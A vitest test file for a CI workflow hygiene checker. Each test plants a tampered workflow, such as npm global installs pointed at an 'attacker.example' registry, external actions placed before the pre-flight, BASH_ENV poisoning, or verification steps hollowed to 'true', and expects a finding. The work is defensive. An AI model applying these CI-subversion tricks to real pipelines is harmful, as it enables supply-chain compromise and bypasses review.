/**
 * The required-status-context declaration, and every property the hygiene lane checks it by.
 *
 * Split out of `workflowHygiene.test.ts`, which had reached 145 rows each spawning the lane as a
 * child process. `node-floor` runs the whole suite in one pool and died twice on a vitest worker
 * RPC timeout with every test passing — one long file is one long-running worker. The fixtures
 * both files plant with are in `helpers/hygieneTree.ts`.
 *
 * What lives here: the declaration's inputs (dependencies, conditions, gate outputs, matrices,
 * command files, local-action digests, install lifecycle, nested actions, the pre-flight) and the
 * properties that read them. What stays there: the structural rules over the two workflow trees,
 * the shipped-tree rules, and the reviewer-artifact bridge.
 */
import { createHash } from "node:crypto";
import { mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import path from "node:path";

import { describe, expect, it } from "vitest";

import {
  type Declaration,
  REPO_ROOT,
  isRecord,
  editDeclaration,
  editWorkflow,
  firstContext,
  onlyContext,
  plantedTree,
  runLane,
} from "./helpers/hygieneTree.js";
describe("the aggregate's dependency topology is declared, not inferred", () => {
  // Review findings [80] and [81]. The verdict is derived from `${{ toJSON(needs) }}`, and its
  // accepting set includes `skipped` — so two things decide what the required context means
  // beyond the seven enumerated verification items: WHICH lanes are in `needs`, and which of
  // them may skip. Neither was pinned anywhere, and property 3 cannot see either: the seven
  // items stay reachable through `detect` and `build` however much of the rest is removed.

  it("reports a lane deleted from the aggregate's needs", () => {
    // The attack as filed: delete `test` from `ci-pass.needs`. The lane still runs and can
    // still fail, but its result never enters the serialized map the verdict reads — and the
    // topology test that would notice runs inside that very job.
    const dir = plantedTree((d) => {
      editWorkflow(d, firstContext(d).workflow, (text) => {
        if (!text.includes("test, scanner-coverage")) {
          throw new Error("the needs list is not in the shape this row plants into");
        }
        return text.replace("test, scanner-coverage", "scanner-coverage");
      });
    });
    try {
      const run = runLane(dir);
      expect
        .soft(run.exitCode, `a lane removed from the verdict must exit 1:\n${run.output}`)
        .toBe(1);
      expect
        .soft(run.output, "the finding must name the lane that left")
        .toMatch(/no longer depends on test/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports a lane the workflow gates on and the declaration does not know about", () => {
    // The other direction, and it is not symmetry for its own sake: a job whose result gates
    // the merge is part of what the required context means, so adding one is a declaration
    // edit. Planted from the declaration's side, which is the same disagreement.
    const dir = plantedTree((d) => {
      editDeclaration(d, (decl) => {
        const context = onlyContext(decl);
        context.dependencies = (context.dependencies ?? []).filter((name) => name !== "build");
        return decl;
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `an undeclared dependency must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/depends on build, which .* does not declare/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("refuses a declaration that pins no dependency set at all", () => {
    // The precondition, and the shape every property in this file needs: a check whose input
    // is absent must report, never pass. Without this the whole pin is removable in one line.
    const dir = plantedTree((d) => {
      editDeclaration(d, (decl) => {
        delete onlyContext(decl).dependencies;
        return decl;
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `an unpinned dependency set must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/declares no .?dependencies.? array/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports a gated lane whose condition changed under it", () => {
    // `if: ${{ false }}` on a gated lane: it skips, the verdict accepts the skip, and property 2
    // does not look — `always()` on the declared job stands its closure check down, deliberately,
    // because a skipped dependency is the state `always()` exists for. Which lanes may skip has
    // to be pinned somewhere, and this is where.
    const dir = plantedTree((d) => {
      editWorkflow(d, firstContext(d).workflow, (text) => {
        // REPLACED, not added: every gated lane already carries this condition, so a second
        // `if:` key is a duplicate-key parse error — which the lane reports as a malformed file,
        // and the row would then have passed on a finding it was not planted to produce.
        // Measured: that is exactly what the first version of this row did.
        const anchor = "    if: " + "${{ needs.detect.outputs.full == 'true' }}";
        if (!text.includes(anchor)) {
          throw new Error("the gated lanes' condition is stale");
        }
        return text.replace(anchor, "    if: ${{ false }}");
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `a rewritten skip condition must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/whose condition is/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports a condition on a lane the declaration says runs every time", () => {
    // The complementary half: `lint` carries no condition, and the declaration says so by
    // omitting it. Making it skippable is the same attack on a lane that had no gate at all.
    const dir = plantedTree((d) => {
      editWorkflow(d, firstContext(d).workflow, (text) => {
        const anchor = "  lint:" + "\n";
        if (!text.includes(anchor)) throw new Error("the lint job anchor is stale");
        return text.replace(anchor, anchor + "    if: ${{ false }}\n");
      });
    });
    try {
      const run = runLane(dir);
      expect
        .soft(run.exitCode, `a new condition on an ungated lane must exit 1:\n${run.output}`)
        .toBe(1);
      expect.soft(run.output).toMatch(/where .* declares none/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports the gate output rewired to a constant", () => {
    // Review finding [81] as filed: `detect.outputs.full: ${{ false }}` skips every gated lane
    // without touching a condition or a line of the classifier, and the classifier's own tests
    // are inside one of the lanes that skips.
    const dir = plantedTree((d) => {
      editWorkflow(d, firstContext(d).workflow, (text) => {
        const anchor = "      full: ${{ steps.classify.outputs.full }}";
        if (!text.includes(anchor)) throw new Error("the detect output wiring is stale");
        return text.replace(anchor, "      full: ${{ false }}");
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `rewiring the gate must exit 1:\n${run.output}`).toBe(1);
      // The KEY that moved, not any key. Measured: a plant that INVERTED the comparison reported
      // the sibling `reason` output instead, which matched a pattern looking only for `wires its
      // output` — so the row passed over a lane that had stopped checking the one value every
      // gated lane is skipped on.
      expect.soft(run.output).toMatch(/wires its output .full./);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports a gate output wired to a step id the job does not declare", () => {
    // The quieter route to the same skip, and the reason the equality check alone is not
    // enough: change the wiring in BOTH files and they agree perfectly while the value is
    // always empty, because no step carries that `id`. Planted in both, so the equality check
    // passes and this is the only property left to fail.
    const dir = plantedTree((d) => {
      const rewired = "${{ steps.absent.outputs.full }}";
      editWorkflow(d, firstContext(d).workflow, (text) => {
        const anchor = "      full: ${{ steps.classify.outputs.full }}";
        if (!text.includes(anchor)) throw new Error("the detect output wiring is stale");
        return text.replace(anchor, `      full: ${rewired}`);
      });
      editDeclaration(d, (decl) => {
        const outputs = onlyContext(decl).gateOutputs;
        if (outputs?.["detect"] === undefined) {
          throw new Error("the declaration pins no detect outputs to rewrite");
        }
        outputs["detect"]["full"] = rewired;
        return decl;
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `a dangling step id must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/which that job does not declare/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("the pre-flight refusal runs before anything can disable it", () => {
  // Review finding [82]. The lane's own report of a poisoned local composite action is
  // unreachable when the poison sits in the action the lane's own job runs first: a step
  // appending `BASH_ENV=<a script that exits 0>` to the environment file makes every later
  // `shell: bash` step exit 0 without running its body, the lane among them. A check the attack
  // disables is not a check, so the refusal moved ahead of the action — and these rows are what
  // keeps it there.

  it("reports the pre-flight step missing from the job that must run it", () => {
    const dir = plantedTree((d) => {
      editWorkflow(d, firstContext(d).workflow, (text) => {
        const step = firstContext(d).preflight?.step;
        if (step === undefined) throw new Error("the declaration pins no pre-flight step");
        const anchor = `      - name: ${step}`;
        if (!text.includes(anchor)) throw new Error("the pre-flight step anchor is stale");
        return text.replace(anchor, `      - name: ${step} (renamed)`);
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `a missing pre-flight must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/declares no step named/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports a step that does work ahead of it", () => {
    // The order is the whole property: a step before it can write the environment file, and
    // then the pre-flight runs under an environment somebody else chose.
    const dir = plantedTree((d) => {
      editWorkflow(d, firstContext(d).workflow, (text) => {
        const step = firstContext(d).preflight?.step;
        if (step === undefined) throw new Error("the declaration pins no pre-flight step");
        const anchor = `      - name: ${step}`;
        if (!text.includes(anchor)) throw new Error("the pre-flight step anchor is stale");
        return text.replace(
          anchor,
          "      - name: Something first\n        run: echo first\n" + anchor,
        );
      });
    });
    try {
      const run = runLane(dir);
      expect
        .soft(run.exitCode, `a step ahead of the pre-flight must exit 1:\n${run.output}`)
        .toBe(1);
      // Naming the step that was PLANTED, not any step ahead of it. Measured: a plant that
      // inverted the test reported `actions/checkout` instead — a step that does no work and
      // is legitimately there — and a pattern looking only for the phrase passed over it.
      expect.soft(run.output).toMatch(/"Something first" before .* must come first/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports an external action ahead of the pre-flight", () => {
    // Review finding [94]. The order check counted `run:` and local `uses:` as work and treated
    // everything else as inert, so `uses: attacker/action@<sha>` could sit before the refusal.
    // `action-pin` proves such a reference is immutable and says nothing about what it does — and
    // an action ahead of the pre-flight can write a command file, or replace the very script the
    // pre-flight is about to run, out of the checkout it just produced.
    const dir = plantedTree((d) => {
      const step = firstContext(d).preflight?.step;
      if (step === undefined) throw new Error("the declaration pins no pre-flight step");
      editWorkflow(d, firstContext(d).workflow, (text) => {
        const anchor = `      - name: ${step}`;
        if (!text.includes(anchor)) throw new Error("the pre-flight step anchor is stale");
        return text.replace(
          anchor,
          "      - uses: planted/action@0000000000000000000000000000000000000000\n" + anchor,
        );
      });
    });
    try {
      const run = runLane(dir);
      expect
        .soft(
          run.exitCode,
          `an external action ahead of the pre-flight must exit 1:\n${run.output}`,
        )
        .toBe(1);
      expect.soft(run.output).toMatch(/which must come first/);
      expect.soft(run.output).toContain("planted/action@");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("still lets the enumerated checkout precede it, or the pre-flight has nothing to read", () => {
    // The control, and it is load-bearing rather than decorative: the refusal reads this
    // repository's files, so the checkout HAS to run first. `mayPrecede` is what says which.
    const dir = plantedTree(() => undefined);
    try {
      const allowed = firstContext(dir).preflight?.mayPrecede ?? [];
      expect(
        allowed.length,
        "the control needs the declaration to allow at least the checkout",
      ).toBeGreaterThan(0);
      const run = runLane(dir);
      expect.soft(run.exitCode, `the tree as it stands must pass:\n${run.output}`).toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("checks what precedes it against the list rather than against nothing", () => {
    // Emptying the list must make the SAME tree fail — otherwise the row above is satisfied by a
    // lane that never looks at what runs before the refusal.
    const dir = plantedTree((d) => {
      editDeclaration(d, (decl) => {
        const context = onlyContext(decl);
        if (context.preflight === undefined) throw new Error("no preflight to edit");
        context.preflight.mayPrecede = [];
        return decl;
      });
    });
    try {
      const run = runLane(dir);
      expect
        .soft(
          run.exitCode,
          `an emptied list must refuse the checkout it used to allow:\n${run.output}`,
        )
        .toBe(1);
      expect.soft(run.output).toMatch(/which must come first/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("refuses a pre-flight declaration that says nothing about what may precede it", () => {
    const dir = plantedTree((d) => {
      editDeclaration(d, (decl) => {
        const context = onlyContext(decl);
        if (context.preflight === undefined) throw new Error("no preflight to edit");
        delete context.preflight.mayPrecede;
        return decl;
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `an absent list must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/no .?mayPrecede.? list/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("refuses a declaration that names no pre-flight at all", () => {
    const dir = plantedTree((d) => {
      editDeclaration(d, (decl) => {
        delete onlyContext(decl).preflight;
        return decl;
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `an unpinned pre-flight must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/declares no .?preflight.? step/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports a pre-flight left out of the verification set, whose body is then pinned by nothing", () => {
    // Declared as the pre-flight and not as a verification: it runs first and can be replaced
    // with `true` without moving a digest. Both halves or neither.
    const dir = plantedTree((d) => {
      editDeclaration(d, (decl) => {
        const context = onlyContext(decl);
        const step = context.preflight?.step;
        if (step === undefined) throw new Error("the declaration pins no pre-flight step");
        context.verificationSet = context.verificationSet.filter((item) => item !== step);
        delete context.verificationBodies?.[step];
        return decl;
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `an unpinned pre-flight body must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/leaves it out of verificationSet/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("the command-file names are one list, read by two refusals", () => {
  it("reports a name dropped from the list both readers open", () => {
    // The one input neither pin covers on its own: the pre-flight step's body digest hashes the
    // SCRIPT, not the data file the script opens at runtime. Dropping `GITHUB_PATH` leaves one
    // name behind, narrows both refusals, and every check still reports PASS.
    const dir = plantedTree((d) => {
      const list = path.join(d, ".github", "command-files.txt");
      const before = readFileSync(list, "utf-8");
      const after = before
        .split(/\r?\n/)
        .filter((line) => line.trim() !== "GITHUB_PATH")
        .join("\n");
      if (after === before) throw new Error("the command-file list is not in the planted shape");
      writeFileSync(list, after, "utf-8");
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `a narrowed command-file list must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/no longer names GITHUB_PATH/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports an emptied list rather than searching for nothing", () => {
    // A by-name rule with no names reports PASS over every step there is.
    const dir = plantedTree((d) => {
      writeFileSync(path.join(d, ".github", "command-files.txt"), "# nothing\n", "utf-8");
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `an empty command-file list must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/no names to look for/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reads the names from the file rather than from anything compiled in", () => {
    // The file is INPUT, not decoration. A lane holding its own copy passes every row above.
    const dir = plantedTree((d) => {
      const list = path.join(d, ".github", "command-files.txt");
      writeFileSync(list, `${readFileSync(list, "utf-8")}PLANTED_COMMAND_FILE\n`, "utf-8");
      editDeclaration(d, (decl) => {
        const context = onlyContext(decl);
        context.commandFiles = [...(context.commandFiles ?? []), "PLANTED_COMMAND_FILE"];
        return decl;
      });
      editWorkflow(d, firstContext(d).workflow, (text) => {
        const anchor = "      - name: Run build & pack verification\n";
        if (!text.includes(anchor)) throw new Error("the build-verify step anchor is stale");
        return text.replace(anchor, "      - run: echo PLANTED_COMMAND_FILE=/dev/null\n" + anchor);
      });
    });
    try {
      const run = runLane(dir);
      expect
        .soft(run.exitCode, `a name added to the list must be refused too:\n${run.output}`)
        .toBe(1);
      // The WRITER finding specifically. Measured: a plant that replaced the reader with a
      // literal still produced a finding mentioning the name — the file-versus-declaration
      // comparison one property up — so a pattern looking only for the name passed over a lane
      // that had stopped reading the file at all.
      expect.soft(run.output).toMatch(/reaches \$PLANTED_COMMAND_FILE/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("a global install names where the package comes from", () => {
  // Review finding [87], after [83]. A pinned VERSION is a name, not a source: `npm` resolves
  // its registry from `NPM_CONFIG_REGISTRY` or from a project `.npmrc`, both of which a pull
  // request controls, so `npm install --global corepack@0.35.0` is a request an attacker's
  // registry can answer with a different package — whose bin then runs in the job that
  // bootstraps the toolchain everything else is verified with.
  //
  // The pin itself was added by hand in that finding. This rule is what keeps it: nothing else in
  // the tree would have noticed it being taken out again.

  for (const [label, planted, missing] of [
    ["no registry at all", "npm install --global corepack@0.35.0", "--registry"],
    [
      "a registry but no --ignore-scripts",
      "npm install --global --registry https://registry.npmjs.org/ corepack@0.35.0",
      "--ignore-scripts",
    ],
    ["the short form of the same install", "npm i -g corepack@0.35.0", "--registry"],
  ] as const) {
    it(`reports ${label}`, () => {
      const dir = plantedTree((d) => {
        editWorkflow(d, firstContext(d).workflow, (text) => {
          const anchor = "      - name: Run build & pack verification\n";
          if (!text.includes(anchor)) throw new Error("the build-verify step anchor is stale");
          return text.replace(
            anchor,
            `      - name: Bootstrap something\n        run: ${planted}\n` + anchor,
          );
        });
      });
      try {
        const run = runLane(dir);
        expect.soft(run.exitCode, `an unpinned global install must exit 1:\n${run.output}`).toBe(1);
        expect.soft(run.output, "the finding must name the rule").toContain("global-install-pin");
        expect
          .soft(run.output, "and say which pin is missing, so the diagnosis is actionable")
          .toContain(missing);
      } finally {
        rmSync(dir, { recursive: true, force: true });
      }
    });
  }

  for (const [label, planted] of [
    [
      "the pin present only in a comment above an unpinned install",
      "      - name: Bootstrap something\n        run: |\n          # --registry and --ignore-scripts, explained at length\n          npm install --global corepack@0.35.0\n",
    ],
    [
      "a registry that is not the trusted one",
      "      - name: Bootstrap something\n        run: npm install --global --ignore-scripts --registry=https://attacker.example corepack@0.35.0\n",
    ],
    [
      "--ignore-scripts turned off",
      "      - name: Bootstrap something\n        run: npm install --global --ignore-scripts=false --registry https://registry.npmjs.org/ corepack@0.35.0\n",
    ],
    [
      "an alias npm accepts and the first enumeration missed",
      "      - name: Bootstrap something\n        run: npm in -g corepack@0.35.0\n",
    ],
  ] as const) {
    it(`reports ${label}`, () => {
      // Review findings [91] and [92]. The first version asked whether the BODY carried the
      // two flags anywhere — and the body it was written for explains both in a comment
      // directly above the command, so reverting the command left every substring in place
      // and the rule green. A flag belongs to an invocation. So does its VALUE: `--registry`
      // is worth nothing unless what it names is checked, and npm's own alias table has ten
      // more spellings of `install` than the first enumeration knew.
      const dir = plantedTree((d) => {
        editWorkflow(d, firstContext(d).workflow, (text) => {
          const anchor = "      - name: Run build & pack verification\n";
          if (!text.includes(anchor)) throw new Error("the build-verify step anchor is stale");
          return text.replace(anchor, planted + anchor);
        });
      });
      try {
        const run = runLane(dir);
        expect.soft(run.exitCode, `${label} must exit 1:\n${run.output}`).toBe(1);
        expect.soft(run.output, "the finding must name the rule").toContain("global-install-pin");
      } finally {
        rmSync(dir, { recursive: true, force: true });
      }
    });
  }

  it("reports a second --registry, because npm takes the last one", () => {
    // Review finding [99]. The check read the FIRST match, so
    // `--registry=<trusted> --registry=<attacker>` passed — and npm resolves that to the
    // attacker's, verified against `npm config get registry` carrying both flags. A duplicate is
    // refused rather than resolved: two answers to one question is not a pin, whichever end this
    // lane reads from.
    const dir = plantedTree((d) => {
      editWorkflow(d, firstContext(d).workflow, (text) => {
        const anchor = "      - name: Run build & pack verification\n";
        if (!text.includes(anchor)) throw new Error("the build-verify step anchor is stale");
        return text.replace(
          anchor,
          "      - name: Bootstrap something\n        run: npm install --global --ignore-scripts --registry=https://registry.npmjs.org/ --registry=https://attacker.example/ corepack@0.35.0\n" +
            anchor,
        );
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `a second registry must exit 1:\n${run.output}`).toBe(1);
      expect
        .soft(run.output, "the finding must say npm takes the last one")
        .toMatch(/npm takes the last/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("accepts the trusted registry in either spelling, and a trailing slash either way", () => {
    // The control, in the two forms a shell writer actually uses. A rule accepting only one
    // of `--registry x` and `--registry=x` would be a rule this repository could not carry,
    // and a trailing slash is the same registry.
    for (const planted of [
      "      - name: Bootstrap something\n        run: npm install --global --ignore-scripts --registry https://registry.npmjs.org/ corepack@0.35.0\n",
      "      - name: Bootstrap something\n        run: npm i -g --ignore-scripts --registry=https://registry.npmjs.org corepack@0.35.0\n",
    ]) {
      const dir = plantedTree((d) => {
        editWorkflow(d, firstContext(d).workflow, (text) => {
          const anchor = "      - name: Run build & pack verification\n";
          if (!text.includes(anchor)) throw new Error("the build-verify step anchor is stale");
          return text.replace(anchor, planted + anchor);
        });
      });
      try {
        const run = runLane(dir);
        expect
          .soft(run.exitCode, `a fully pinned install must not be a finding:\n${run.output}`)
          .toBe(0);
      } finally {
        rmSync(dir, { recursive: true, force: true });
      }
    }
  });

  it("accepts an install that names both, which is the half a blanket refusal would break", () => {
    // The control. The repository's own fallbacks already carry both flags — a lane that refused
    // every global install would fail on the tree as it stands, and this row is what says the
    // rule is a pin rather than a ban.
    const dir = plantedTree((d) => {
      editWorkflow(d, firstContext(d).workflow, (text) => {
        const anchor = "      - name: Run build & pack verification\n";
        if (!text.includes(anchor)) throw new Error("the build-verify step anchor is stale");
        return text.replace(
          anchor,
          "      - name: Bootstrap something\n" +
            "        run: npm install --global --ignore-scripts --registry https://registry.npmjs.org/ corepack@0.35.0\n" +
            anchor,
        );
      });
    });
    try {
      const run = runLane(dir);
      expect
        .soft(run.exitCode, `a fully pinned global install must not be a finding:\n${run.output}`)
        .toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("leaves a local install alone, which reaches no global bin", () => {
    // The other direction of the same boundary: `npm install` without `--global` installs into
    // the project, which is what every lockfile-aware lane in both trees does. A rule that fired
    // on those would be a rule this repository could not carry.
    const dir = plantedTree((d) => {
      editWorkflow(d, firstContext(d).workflow, (text) => {
        const anchor = "      - name: Run build & pack verification\n";
        if (!text.includes(anchor)) throw new Error("the build-verify step anchor is stale");
        return text.replace(
          anchor,
          "      - name: Bootstrap something\n        run: npm install --no-audit\n" + anchor,
        );
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `a project install is not a global one:\n${run.output}`).toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reaches a local composite action, where the install this rule was written for lives", () => {
    // Not a corner: the fallback finding [83] pinned is inside `./.github/actions/setup`, not in
    // any workflow file. A rule scanning workflow steps alone would have missed the one install
    // it exists for.
    const dir = plantedTree((d) => {
      const action = path.join(d, ".github", "actions", "setup", "action.yml");
      const before = readFileSync(action, "utf-8");
      const anchor = "  steps:" + "\n";
      if (!before.includes(anchor)) throw new Error("the composite steps anchor is stale");
      writeFileSync(
        action,
        before.replace(
          anchor,
          anchor +
            "    - name: Bootstrap something\n" +
            "      shell: bash\n" +
            "      run: npm install --global corepack@0.35.0\n",
        ),
        "utf-8",
      );
    });
    try {
      const run = runLane(dir);
      expect
        .soft(run.exitCode, `an unpinned install inside a local action must exit 1:\n${run.output}`)
        .toBe(1);
      expect.soft(run.output).toContain("global-install-pin");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("the work of a lane that may skip is pinned too", () => {
  // Review finding [89]. A gated lane was a declared dependency by name and condition and
  // nothing else, so replacing `pnpm ci:coverage` with `true` left this lane silent, the job
  // green and the aggregate green — while no other job in the repository runs that script, so
  // the coverage floor stopped being checked at all. Being IN the aggregate is not the same
  // claim as still doing the work.

  /** The first gated item and the job the declaration puts it in. */
  function firstGated(dir: string): { item: string; job: string } {
    const entries = Object.entries(firstContext(dir).gatedVerifications ?? {});
    const [first] = entries;
    if (first === undefined) throw new Error("the declaration pins no gated verification");
    return { item: first[0], job: first[1] };
  }

  it("reports a gated lane whose body was replaced with something that does nothing", () => {
    const dir = plantedTree((d) => {
      const { item } = firstGated(d);
      editWorkflow(d, firstContext(d).workflow, (text) => {
        const anchor = `      - name: ${item}`;
        if (!text.includes(anchor)) throw new Error("the gated step anchor is stale");
        // The name stays and the work goes, which is the whole shape of the finding.
        const at = text.indexOf(anchor);
        const nextStep = text.indexOf(`\n      - `, at + anchor.length);
        const end = nextStep === -1 ? text.length : nextStep;
        return `${text.slice(0, at)}${anchor}\n        run: true${text.slice(end)}`;
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `a hollowed-out gated lane must exit 1:\n${run.output}`).toBe(1);
      expect
        .soft(run.output, "the finding must name the item whose body moved")
        .toContain(firstGated(REPO_ROOT).item);
      expect
        .soft(run.output, "and say what to do, because a digest mismatch is otherwise unactionable")
        .toContain("pin-verification-bodies");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports a second gate inside a lane whose skip is already declared", () => {
    // The lane's condition is pinned in `dependencyConditions`. A condition ON THE STEP is a
    // second one the declaration does not know about, and it can stop the work on runs where the
    // lane did not skip.
    const dir = plantedTree((d) => {
      const { item } = firstGated(d);
      editWorkflow(d, firstContext(d).workflow, (text) => {
        const anchor = `      - name: ${item}\n`;
        if (!text.includes(anchor)) throw new Error("the gated step anchor is stale");
        return text.replace(anchor, `${anchor}        if: \${{ false }}\n`);
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `a second gate must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/behind its own condition/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports a gated lane allowed to fail without failing its job", () => {
    const dir = plantedTree((d) => {
      const { item } = firstGated(d);
      editWorkflow(d, firstContext(d).workflow, (text) => {
        const anchor = `      - name: ${item}\n`;
        if (!text.includes(anchor)) throw new Error("the gated step anchor is stale");
        return text.replace(anchor, `${anchor}        continue-on-error: true\n`);
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `a discarded failure must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/continue-on-error/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports a gated item the declaration pins no body for", () => {
    // The precondition. A named item with no digest is pinned by nothing, and the name alone is
    // what review finding [89] measured as worthless.
    const dir = plantedTree((d) => {
      editDeclaration(d, (decl) => {
        const context = onlyContext(decl);
        const [item] = Object.keys(context.gatedVerifications ?? {});
        if (item === undefined) throw new Error("the declaration pins no gated verification");
        delete context.verificationBodies?.[item];
        return decl;
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `an unpinned gated body must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/records no body digest/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports a gated item whose job no longer declares the step", () => {
    const dir = plantedTree((d) => {
      const { item } = firstGated(d);
      editWorkflow(d, firstContext(d).workflow, (text) => {
        const anchor = `      - name: ${item}`;
        if (!text.includes(anchor)) throw new Error("the gated step anchor is stale");
        return text.replace(anchor, `      - name: ${item} (renamed)`);
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `a renamed gated step must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/declares no step named/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("an external action inside a local one is code the closure runs", () => {
  // Review finding [88]. The scan that reads a local action's steps followed `./` references
  // only, so `uses: attacker/action@<sha>` inside the toolchain preamble every job runs first was
  // passed over. `action-pin` proves such a reference is immutable and says nothing about what it
  // does; the pre-flight refusal reads this repository's checkout, not the action's code.

  it("reports an external action the declaration does not enumerate", () => {
    const dir = plantedTree((d) => {
      const action = path.join(d, ".github", "actions", "setup", "action.yml");
      const before = readFileSync(action, "utf-8");
      const anchor = "  steps:" + "\n";
      if (!before.includes(anchor)) throw new Error("the composite steps anchor is stale");
      writeFileSync(
        action,
        before.replace(
          anchor,
          anchor + "    - uses: planted/action@0000000000000000000000000000000000000000" + "\n",
        ),
        "utf-8",
      );
    });
    try {
      const run = runLane(dir);
      expect
        .soft(run.exitCode, `an unenumerated external action must exit 1:\n${run.output}`)
        .toBe(1);
      expect
        .soft(run.output, "the finding must name the reference an operator has to look at")
        .toContain("planted/action@");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("accepts the enumerated one, so the rule is a list and not a ban", () => {
    // The control, and it is load-bearing: the preamble legitimately needs an external action to
    // get a Node. A lane that refused every one of them would fail on the tree as it stands.
    const dir = plantedTree(() => undefined);
    try {
      const declared = firstContext(dir).nestedActions ?? [];
      expect(
        declared.length,
        "the control needs the declaration to enumerate at least one external action",
      ).toBeGreaterThan(0);
      const run = runLane(dir);
      expect.soft(run.exitCode, `the tree as it stands must pass:\n${run.output}`).toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("checks the enumerated one against the list rather than against nothing", () => {
    // The row above passes for a lane that never looks. Removing the entry from the declaration
    // must make the SAME tree fail — which is what says the list is read.
    const dir = plantedTree((d) => {
      editDeclaration(d, (decl) => {
        onlyContext(decl).nestedActions = [];
        return decl;
      });
    });
    try {
      const run = runLane(dir);
      expect
        .soft(
          run.exitCode,
          `an emptied list must refuse the action it used to allow:\n${run.output}`,
        )
        .toBe(1);
      expect.soft(run.output).toMatch(/does not enumerate/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reaches an external action one local action deeper", () => {
    // The nested arm. A scan that read only the directly-invoked action would report nothing,
    // and `uses: ./…` inside a composite action is legal — which is the indirection.
    const dir = plantedTree((d) => {
      const inner = path.join(d, ".github", "actions", "inner");
      mkdirSync(inner, { recursive: true });
      writeFileSync(
        path.join(inner, "action.yml"),
        [
          "name: inner",
          "description: planted",
          "runs:",
          "  using: composite",
          "  steps:",
          "    - uses: planted/deep@0000000000000000000000000000000000000000",
          "",
        ].join("\n"),
        "utf-8",
      );
      const outer = path.join(d, ".github", "actions", "setup", "action.yml");
      const before = readFileSync(outer, "utf-8");
      const anchor = "  steps:" + "\n";
      if (!before.includes(anchor)) throw new Error("the composite steps anchor is stale");
      writeFileSync(
        outer,
        before.replace(anchor, anchor + "    - uses: ./.github/actions/inner\n"),
        "utf-8",
      );
    });
    try {
      const run = runLane(dir);
      expect
        .soft(run.exitCode, `an external action one level deeper must exit 1:\n${run.output}`)
        .toBe(1);
      expect.soft(run.output).toContain("planted/deep@");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
